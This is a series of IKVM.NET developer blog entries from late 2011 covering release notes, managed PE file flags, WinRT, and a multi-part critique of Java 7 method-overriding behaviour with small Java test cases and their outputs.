		<P>The first release candidate is available. No changes (except the version number and&nbsp;strong naming)&nbsp;relative to the last development snapshot.</P>
<P>What's New (relative to <A href="/PermaLink.aspx?guid=94934445-9b06-4a81-b76b-fcd23d4f6ec2">IKVM.NET 0.46</A>):</P>
<UL>
<LI>Integrated OpenJDK 7 b147. 
<LI>Implemented Java 7 JVM changes. 
<LI>Java annotations on statically compiled code are now returned as java.lang.reflect.Proxy objects for compability with broken code that assumes this is always the&nbsp;case. 
<LI>Added delegate conversion for java.lang.reflect.InvocationHandler to ikvm.runtime.Delegates. 
<LI>Various remap file improvements. 
<LI>Changed build and JNI code to use different names for the Windows x86 and x64 versions of the native dll. 
<LI>Retain reflection field ordering for ikvmc compiled code (not required by spec, but to improve compatibility with broken code). 
<LI>Various AWT fixes. 
<LI>Interop between <A href="/PermaLink.aspx?guid=de964df2-d54f-455b-8ec6-5288bbb4b532">java.lang.AutoCloseable</A> and System.IDisposable. 
<LI>Various build system improvements. 
<LI>Added ikvmc -warnaserror option. 
<LI>Fixed java.io.FileOutputStream in append mode to use atomic append. 
<LI>Various performance improvements. 
<LI>Added -Xnoglobbing option to ikvm.exe. 
<LI>Various minor fixes. 
<LI>Implemented dual stack sockets (Windows Vista and up only). 
<LI>Implemented platform MBean server. 
<LI>Implemented SocketChannel.sendOutOfBandData(). 
<LI>Implemented DatagramChannel multicast methods. 
<LI>Removed mapping of System.Security.VerificationException to java.lang.VerifyError. 
<LI>IKVM.Reflection: Massive enhancements to support a very large portion of the managed PE capabilities (much more than System.Reflection.Emit).</LI></UL>
<P>When the final release is done, it will include the full release notes.</P>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4335.0.zip">ikvmbin-7.0.4335.0.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.0.4335.0.zip">ikvmsrc-7.0.4335.0.zip</A>, <A href="http://www.frijters.net/openjdk7-b147-stripped.zip">openjdk7-b147-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/14/2011 14:01:32 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0f65c7f6-796d-4b27-97ed-b7b1230842c0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0f65c7f6-796d-4b27-97ed-b7b1230842c0">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="a7c760276-fc97-4b90-9208-5d67797b21a7"></a><div class="entry">
	<h3 class="entryTitle">Managed PE File Types</h3>
	<div class="entryBody">
		<P>Just a quick blog about the different types of managed PE files.</P>
<P>Here's a table:</P>
<TABLE border=1 borderColor=black>
<TBODY>
<TR>
<TD><B>Description</B></TD>
<TD style="FONT-WEIGHT: 700">C# compiler switch</TD>
<TD><B>PE type</B></TD>
<TD><B>machine</B></TD>
<TD><B>corflags</B></TD></TR>
<TR>
<TD>MSIL</TD>
<TD>/platform:anycpu (default)</TD>
<TD>PE32</TD>
<TD>x86</TD>
<TD>ILONLY</TD></TR>
<TR>
<TD>MSIL 32 bit preferred</TD>
<TD>/platform:anycpu32bitpreferred</TD>
<TD>PE32</TD>
<TD>x86</TD>
<TD>ILONLY | 32BITREQUIRED | 32BITPREFERRED</TD></TR>
<TR>
<TD>x86 managed</TD>
<TD>/platform:x86</TD>
<TD>PE32</TD>
<TD>x86</TD>
<TD>ILONLY | 32BITREQUIRED</TD></TR>
<TR>
<TD>x86 mixed</TD>
<TD>n/a</TD>
<TD>PE32</TD>
<TD>x86</TD>
<TD>32BITREQUIRED</TD></TR>
<TR>
<TD>x64 managed</TD>
<TD>/platform:x64</TD>
<TD>PE32+</TD>
<TD>x64</TD>
<TD>ILONLY</TD></TR>
<TR>
<TD>x64 mixed</TD>
<TD>n/a</TD>
<TD>PE32+</TD>
<TD>x64</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>ARM managed</TD>
<TD>/platform:arm</TD>
<TD>PE32</TD>
<TD>ARM</TD>
<TD>ILONLY</TD></TR>
<TR>
<TD>ARM mixed</TD>
<TD>n/a</TD>
<TD>PE32</TD>
<TD>ARM</TD>
<TD>&nbsp;</TD></TR></TBODY></TABLE>
<P>The MSIL 32 bit preferred and ARM types are new in .NET 4.5. I've left out Itanium, because it's not that interesting.</P>
<P>For legacy reasons pure MSIL files specify x86 as the machine type and when you really want to target just x86 you need to set the (confusingly named) COMIMAGE_FLAGS_32BITREQUIRED flag.</P>
<P>When the COMIMAGE_FLAGS_32BITREQUIRED flag was introduced (back in .NET 1.0) they probably intended it to just mean that the image required a 32 bit architecture (not necessarily x86), but then the C# compiler mapped the /platform:x86 switch to this flag and they were locked into it meaning just x86.</P>
<P>Starting with Visual Studio 2010, the default platform target project setting for executables changed from Any CPU to x86. This was probably because x64 systems were becoming more popular and more people started running into the poor x64 JIT performance and its many bugs.</P>
<P>With the introduction of ARM support in Windows 8 there was now a need for a new flag to avoid the x64 JIT, but still be cross platform, so the COMIMAGE_FLAGS_32BITPREFERRED flag was invented. For downward compatibility, this flag is not set by itself, but instead modifies the meaning of the COMIMAGE_FLAGS_32BITREQUIRED flag, to allow .NET 4.0 systems to continue to run the executable in 32 bit mode (they simply ignore the new flag) while on ARM systems the system can see that the executable is not x86 specific because the new flag is set.</P>
<P>Finally, when your PE file contains unmanaged exports the ILONLY flag must not be set or the loader will refuse to load the file.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/14/2011 09:18:51 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7c760276-fc97-4b90-9208-5d67797b21a7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7c760276-fc97-4b90-9208-5d67797b21a7">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 07 November 2011</h2></div>
<div class="newsItems"><a name="ae1824332-c16f-4f25-b94a-65c3478060bd"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've implemented the JDK 7 method overriding behavior. So this should be the final snapshot before the 7.0 release candidate.</P>
<P>It's really a testament to the .NET method overriding model that I was able to easily implement all the weird JDK 7 behavior without resorting to any hacks. It's a simple matter of using <A href="http://msdn.microsoft.com/en-us/library/system.reflection.methodattributes.aspx">MethodAttributes.NewSlot</A> and <A href="http://msdn.microsoft.com/en-us/library/system.reflection.emit.typebuilder.definemethodoverride.aspx">TypeBuilder.DefineMethodOverride()</A> in the right places.</P>
<P>Changes:</P>
<UL>
<LI>Updated LICENSE and THIRD_PARTY_README to OpenJDK 7. Thanks to Martin for pointing out in the <A HREF="/CommentView.aspx?guid=1e97aece-acdd-4d63-bc97-57443a69fa9e">comments</A> this was still missing. 
<LI>Implemented JDK 7 method overriding behavior (minus the <A HREF="/PermaLink.aspx?guid=f58b4ef6-4077-4f23-a840-b784d28db586">part 5</A> bug).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4328.zip">ikvmbin-7.0.4328.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/07/2011 07:46:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e1824332-c16f-4f25-b94a-65c3478060bd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e1824332-c16f-4f25-b94a-65c3478060bd">Comments [1]</a>
		
		<br clear="all">
	</div>
</div><a name="a20d36b38-5aa8-47df-bad6-297d02dbeb4f"></a><div class="entry">
	<h3 class="entryTitle">Java Method Overriding Is FUBAR Part 6 of ∞</h3>
	<div class="entryBody">
		<P>Parts 1 through 5 described behavior that is new in JDK 7, but there are also pre-existing bugs.</P>
<P>When you declare a static method as final (which makes no sense and there is no good reason this was ever allowed) you disallow a virtual method in a base class from being overridden:</P>
<P><CODE>public class A<BR>{<BR>&nbsp; public void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("A.foo");<BR>&nbsp; }<BR>}<BR><BR>public class B extends A<BR>{<BR>&nbsp; public static final void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("B.foo");<BR>&nbsp; }<BR>} <BR><BR>public class C extends B<BR>{<BR>&nbsp; public void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("C.foo");<BR>&nbsp; }<BR>}<BR><BR>public class test<BR>{<BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; new C();<BR>&nbsp; }<BR>} <BR></CODE></P>
<P>After you compile this (the easiest trick is probably to rename the B.foo method to f__ and after you compile use a hex editor to patch the resulting class file) and run it, you get:</P>
<P><CODE>Exception in thread "main" java.lang.VerifyError: class C overrides final method foo.()V<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at ...<BR><BR></CODE></P>
<P>Like I said, this is not new. I also tried this on JDK 1.1 and JDK 1.5 and on 1.1 behaves as expected and 1.5 has the modern behavior.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/07/2011 07:12:25 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=20d36b38-5aa8-47df-bad6-297d02dbeb4f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=20d36b38-5aa8-47df-bad6-297d02dbeb4f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 04 November 2011</h2></div>
<div class="newsItems"><a name="af58b4ef6-4077-4f23-a840-b784d28db586"></a><div class="entry">
	<h3 class="entryTitle">Java Method Overriding Is FUBAR Part 5 of ∞</h3>
	<div class="entryBody">
		<P>One of the bizarre things is that the method overriding behavior changed between Java 6 and Java 7 (and HotSpot preserves the Java 6 behavior for classes that have major class file version &lt; 51), but the spec doesn't mention this at all, where it generally is pretty good about mentioning different behavior based on class file version.</P>
<P>Here's an example that uses a class hierarchy that mixes version 50 and 51 classes to confuse HotSpot JDK 7:</P>
<P><CODE>package p1;<BR><BR>public class A<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; public void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("A.foo");<BR>&nbsp; }<BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; new p4.D();<BR>&nbsp; }<BR>}<BR><BR>package p2;<BR><BR>public class B extends p1.A<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("B.foo");<BR>&nbsp; }<BR>} <BR><BR>package p3;<BR><BR>public class C extends p2.B<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("C.foo");<BR>&nbsp; }<BR>} <BR><BR>package p4;<BR><BR>public class D extends p3.C<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("D.foo");<BR>&nbsp; }<BR>} <BR></CODE></P>
<P>Here's a table view of the structure:</P>
<P>
<TABLE>
<TBODY>
<TR>
<TH>p1&nbsp;&nbsp;</TH>
<TH>p2&nbsp;&nbsp;</TH>
<TH>p3&nbsp;&nbsp;</TH>
<TH>p4</TH></TR>
<TR>
<TD>A</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>B</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>C</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>D</TD></TR></TBODY></TABLE></P>
<P>After you compile this with javac 7 (again using the trick to first compile without the public modifier on A.foo) then use a hex editor to modify p3/C.class to change the class file version from 51 (33 hex) to 50 (32 hex) at offset 7 in the file.</P>
<P>When you run it you get:</P>
<P><CODE>D.foo<BR>D.foo<BR>Exception in thread "main" java.lang.AbstractMethodError: p3.C.foo()V<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at p3.C.<INIT>(C.java:5)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at p4.D.<INIT>(D.java:3)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at p1.A.main(A.java:10)<BR></CODE></P>
<P>(This is a variation of the bug I reported <A href="http://groups.google.com/group/jvm-languages/msg/e2f30228592851e2">here</A>.)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/04/2011 08:54:44 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f58b4ef6-4077-4f23-a840-b784d28db586"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f58b4ef6-4077-4f23-a840-b784d28db586">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="ab71f9c5c-ce57-4620-a3bd-b30f9cbe3d4e"></a><div class="entry">
	<h3 class="entryTitle">Java Method Overriding Is FUBAR Part 4 of ∞</h3>
	<div class="entryBody">
		<P>Another example of broken JDK 7 behavior:</P>
<P><CODE>package p1;<BR><BR>public class A<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("A.foo");<BR>&nbsp; }<BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; new p3.F();<BR>&nbsp; }<BR>}<BR><BR>package p2;<BR><BR>public class B extends p1.A<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("B.foo");<BR>&nbsp; }<BR>} <BR><BR>package p2;<BR><BR>public class C extends p2.B<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("C.foo");<BR>&nbsp; }<BR>} <BR><BR>package p3;<BR><BR>public class D extends p2.C<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("D.foo");<BR>&nbsp; }<BR>} <BR><BR>package p1;<BR><BR>public class E extends p3.D<BR>{<BR>&nbsp;{ foo(); }<BR>&nbsp;void foo() {<BR>&nbsp;&nbsp; System.out.println("E.foo");<BR>&nbsp;}<BR>} <BR><BR>package p3;<BR><BR>public class F extends p1.E<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("F.foo");<BR>&nbsp; }<BR>} </CODE></P>
<P>To make this is a little clearer, here's a table view of the structure:</P>
<P>
<TABLE>
<TBODY>
<TR>
<TH>p1&nbsp;&nbsp;</TH>
<TH>p2&nbsp;&nbsp;</TH>
<TH>p3&nbsp;&nbsp;</TH></TR>
<TR>
<TD>A</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>B</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>C</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>D</TD></TR>
<TR>
<TD>E</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>F</TD></TR></TBODY></TABLE></P>
<P>When you run it you get:</P>
<P><CODE>F.foo<BR>C.foo<BR>C.foo<BR>F.foo<BR>F.foo<BR>F.foo</CODE></P>
<P>Not only is this not compliant with the spec, it just plain makes no sense.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/04/2011 08:32:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b71f9c5c-ce57-4620-a3bd-b30f9cbe3d4e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b71f9c5c-ce57-4620-a3bd-b30f9cbe3d4e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a799f5ea0-6648-46c0-b70d-e9b80c6d2669"></a><div class="entry">
	<h3 class="entryTitle">Java Method Overriding Is FUBAR Part 3 of ∞</h3>
	<div class="entryBody">
		<P>For another example of weird JDK 7 behavior, start with the code from <A HREF="/PermaLink.aspx?guid=26f52fff-7284-4d90-bff5-cbfb3fae94ed">part 2</A> and make B.foo final.</P>
<P>When you run that you get:</P>
<P><CODE>C.foo<BR>B.foo</CODE></P>
<P>So now C.foo suddenly doesn't override B.foo. This also violates the spec, because when a method that would have been overridden is marked final the verifier should fail to load the class. This shows that the verifier and vtable layout code have different ideas about method overriding semantics.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/04/2011 07:33:47 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=799f5ea0-6648-46c0-b70d-e9b80c6d2669"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=799f5ea0-6648-46c0-b70d-e9b80c6d2669">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a26f52fff-7284-4d90-bff5-cbfb3fae94ed"></a><div class="entry">
	<h3 class="entryTitle">Java Method Overriding Is FUBAR Part 2 of ∞</h3>
	<div class="entryBody">
		<P>In <A HREF="/PermaLink.aspx?guid=bde44d8b-7ba9-4e0e-b3a6-b735627118ff">part 1</A> of this series I argued that the spec is broken, now I'll show the first example where the reference implementation does not implement the spec.</P>
<P><CODE>package p1;<BR><BR>public class A<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; public void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("A.foo");<BR>&nbsp; }<BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; new p3.C();<BR>&nbsp; }<BR>}<BR><BR>package p2;<BR><BR>public class B extends p1.A<BR>{<BR>&nbsp; { foo(); }<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("B.foo");<BR>&nbsp; }<BR>}<BR><BR>package p3;<BR><BR>public class C extends p2.B<BR>{<BR>&nbsp; void foo() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("C.foo");<BR>&nbsp; }<BR>}</CODE></P>
<P>(If you want to compile this with javac you'll need to first compile it with a version of A that does not have a public foo method and then change A and just recompile A.)</P>
<P>Now the question is does C.foo override B.foo? According to the spec it does not, but when you compile this with javac from JDK 7 (because the class file version needs to be 51 to get the new behavior) and run it you get:</P>
<P><CODE>C.foo<BR>C.foo</CODE></P>
<P>So C.foo overrides both A.foo and B.foo.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/04/2011 07:27:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=26f52fff-7284-4d90-bff5-cbfb3fae94ed"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=26f52fff-7284-4d90-bff5-cbfb3fae94ed">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="abde44d8b-7ba9-4e0e-b3a6-b735627118ff"></a><div class="entry">
	<h3 class="entryTitle">Java Method Overriding Is FUBAR Part 1 of ∞</h3>
	<div class="entryBody">
		<P>The Java Virtual Machine Specification Java SE 7 Edition finally has a section about method overriding (5.4.5). Unfortunately, it does not document the behavior of the Java 7 reference implementation, nor the Java 6 behavior. It also turns out to be a bad design.</P>
<P>Suppose you have a third party widget framework that has a class:</P>
<P><CODE>package org.example;<BR><BR>public class Widget<BR>{<BR>}</CODE></P>
<P>And your application has a subclass of Widget:</P>
<P><CODE>package fubar.tech;<BR><BR>public class MyWidget extends org.example.Widget<BR>{<BR>&nbsp;&nbsp;void frob() { ... }<BR>}</CODE></P>
<P>The frob() method is package private and you don't want external code calling it. Now a new version of the widget framework is released that adds a frob method to Widget:</P>
<P><CODE>package org.example;<BR><BR>public class Widget<BR>{<BR>&nbsp; public void frob() { }<BR>}</CODE></P>
<P>Starting with Java 7 (and this particular behavior is defined by the spec) your package private MyWidget frob() will now override Widget.frob() and hence be callable by anyone who happens to have a reference to your object. If MyWidget.frob() does anything security critical, the third party framework has now introduced a vulnerability in your code.</P>
<P>Java already had a poor story for adding virtual methods to&nbsp;public classes, but this change has made it even worse.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/04/2011 07:01:39 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=bde44d8b-7ba9-4e0e-b3a6-b735627118ff"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=bde44d8b-7ba9-4e0e-b3a6-b735627118ff">Comments [7]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 31 October 2011</h2></div>
<div class="newsItems"><a name="a1e97aece-acdd-4d63-bc97-57443a69fa9e"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Fixed the remaining known OpenJDK 7 issues, apart from method overriding, which finally made it into the JVM spec (section 5.4.5), but it's not clear yet what the actual behavior should be. It's a little ridiculous, but almost 16 years after the release of Java 1.0 a fundamental part of the JVM is still <A href="http://groups.google.com/group/jvm-languages/msg/469f1845486b18a8">poorly documented</A> and <A href="http://groups.google.com/group/jvm-languages/msg/e2f30228592851e2">implemented</A>.</P>
<P>Changes:</P>
<UL>
<LI>Added ikvmc -platform:arm and -platform:anycpu32bitpreferred options. 
<LI>Bug fix. Make sure sun.misc.Launcher is initialized before setting a security manager, because Launcher assumes there is no security manager yet. 
<LI>Added ikvmstub -forwarders option to support ".NET Core profile" assemblies. 
<LI>Implemented com.sun.security.auth.module.NTSystem.getCurrent(). 
<LI>Fixed Throwable.fillInStackTrace() to respect non-writeable stack trace. 
<LI>Fixed Throwable deserialization issues introduced with OpenJDK 7. 
<LI>Fixed Throwable.getSuppressed() to return a global empty array (OpenJDK tests depend on that). 
<LI>Fixed java.lang.ProcessImpl pipe to flush writes. 
<LI>Fixed java.lang.ProcessImpl.openForAtomicAppend() to actually use atomic append. 
<LI>Fixed java.lang.ProcessImpl to clear out the existing environment variables when an envblock is specified. 
<LI>Implemented java.lang.ProcessImpl redirectErrorStream for case where stdout is not also redirected. 
<LI>Fixed core library build issue. java.lang.AutoCloseable.close() method may be used before it has been linked. 
<LI>Bug fix. When calling a final method on a remapped type we can't call the instance method in the remapped type, but we have to call the instancehelper instead. 
<LI>Starting with class file version 51 the &lt;clinit&gt; methods need to be static. 
<LI>Added java.nio.file security manager checks. 
<LI>Added workaround for <A href="https://sourceforge.net/mailarchive/message.php?msg_id=28250469">another x64 JIT bug</A>. 
<LI>IKVM.Reflection: Added .NET 4.5 metadata enum values. 
<LI>IKVM.Reflection: Added support for PortableExecutableKinds.Preferred32Bit. 
<LI>IKVM.Reflection: Added support for process architecture in assembly flags. </LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4321.zip">ikvmbin-7.0.4321.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/31/2011 12:01:05 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1e97aece-acdd-4d63-bc97-57443a69fa9e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1e97aece-acdd-4d63-bc97-57443a69fa9e">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 10 October 2011</h2></div>
<div class="newsItems"><a name="ab41e7d99-eef3-43dc-8169-ed20865067e6"></a><div class="entry">
	<h3 class="entryTitle">Windows Runtime (aka WinRT) Thoughts</h3>
	<div class="entryBody">
		<P><STRONG>Confusion</STRONG></P>
<P>After the <A href="http://channel9.msdn.com/Events/BUILD/BUILD2011/BPS-1005">Build keynote</A> many people were confused. I think there were three main reasons for that: 1) Metro Style Apps and Windows Runtime APIs were introduced together, 2) marketing had banned the mention of COM and 3) Windows Runtime is a bad name.</P>
<P>As the conference progressed and people had time to ask more questions and attend more sessions things became a bit clearer. If you haven't already done so, please read <A href="http://tirania.org/blog/archive/2011/Sep-15.html">Miguel's blog entry about WinRT</A>.</P>
<P>Let's dive deeper into the three points of confusion:</P>
<OL>
<LI>Metro Style Apps and Windows Runtime are two orthogonal concepts.<BR>I expect some people to take issue with this, but the reality is that Metro is a new application model and WinRT is a new way of exposing Windows APIs. They are <STRONG>completely </STRONG>orthogonal. To be clear, most new WinRT APIs are only usuable from Metro Style Apps, but that is simply a consequence of the fact that many new APIs were added to support Metro and WinRT is the obvious way to do it.<BR>It should be obvious by now, but I'll explicitly mention it. Some WinRT APIs are usable from non-Metro apps and some <A href="http://msdn.microsoft.com/en-us/library/windows/apps/br205757(v=VS.85).aspx">Win32 APIs are useable from Metro</A> apps.</LI>
<LI>WinRT is an evolution of COM. IMO, if they had mentioned this during the keynote, there would have been a lot less confusion. However, marketing had apparently found that people don't like COM and so it was decided that this should not be mentioned, of course during subsequent talks it <A href="http://channel9.msdn.com/Events/BUILD/BUILD2011/PLAT-875T">quickly became obvious</A> anyway.</LI>
<LI>The Runtime in "Windows Runtime" is like the Runtime in "C runtime library", not like the Runtime in "Common Language Runtime". The Windows Runtime is not an execution environment, just a set of APIs and a way of exposing these APIs (and your own APIs using a similar mechanism).</LI></OL>
<P><STRONG>What About .NET?</STRONG></P>
<P>Like COM, Windows Runtime APIs can be used from different languages (but the language needs to do some work to enable this). Microsoft supports using WinRT APIs from C/C++, Javascript and C#/VB. All of these languages were modified to support this. Not all .NET languages automatically get full support for WinRT, for example there is currently no first class WinRT support in F#.</P>
<P>Some people thought that .NET was going to be replaced by WinRT (probably due to reason 3 above), but this clearly doesn't make sense.</P>
<P>Something of interest from a .NET point of view is that instead of type libraries WinRT uses the .NET (ECMA CLI) metadata format to describe the APIs. I made a couple of minor tweaks to IKVM.Reflection to better support this.</P>
<P><STRONG>What About IKVM.NET?</STRONG></P>
<P>I have not yet investigated exactly what is needed for WinRT support in IKVM.NET, but it is very likely that WinRT support will arrive some time before Windows 8 is released.</P>
<P>Note however that running IKVM.NET inside Metro Style Apps will not be supported, because the .NET Metro profile is very limited. Hopefully more about this in a future blog entry.</P>
<P><STRONG>Recommended Viewing</STRONG></P>
<P><A href="http://channel9.msdn.com/Events/BUILD/BUILD2011/PLAT-874T">Lap around the Windows Runtime</A><BR><A href="http://channel9.msdn.com/Events/BUILD/BUILD2011/PLAT-875T">Windows Runtime internals: understanding "Hello World"</A><BR><A href="http://channel9.msdn.com/Events/BUILD/BUILD2011/PLAT-876T">Ten Tips When Writing a Hybrid Language Metro style Application</A> (this title is very misleading, it really is about the design of WinRT)<BR></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/10/2011 11:10:17 (W. Europe Daylight Time, UTC+02:00)&nbsp;
